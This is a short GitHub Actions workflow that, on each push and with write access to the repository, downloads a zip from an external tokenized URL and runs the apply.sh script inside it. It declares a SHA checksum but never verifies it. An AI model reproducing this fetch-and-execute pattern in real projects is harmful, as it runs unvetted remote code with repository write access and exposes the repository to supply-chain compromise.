name: apply
on: push
permissions:
  contents: write
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: "17"
      - uses: android-actions/setup-android@v3
      - env:
          URL: https://static.teamily.ai/sites/ca636d4d-36c6-4407-9059-24fdbab23b20/documents/mf2_ringfix3/mf2_ringfix_v3.zip?tk=c2l0ZTpjYTYzNmQ0ZC0zNmM2LTQ0MDctOTA1OS0yNGZkYmFiMjNiMjAvZG9jdW1lbnRzL21mMl9yaW5nZml4MzoxNzg5Mzk0NjM2.MTA3ODg2ZTc5ZWVmMmQ0ZTQ3NWRmMjBjMDU4Njk5NDI
          SHA: f49a896fc3e519b48bfb172486ca0688ce3472d79691d8035dd6afa5fdb41fe0
        run: |
          curl -sSL --retry 3 -o /tmp/u.zip "$URL"
          unzip -q -o /tmp/u.zip -d /tmp/u
          bash /tmp/u/apply.sh
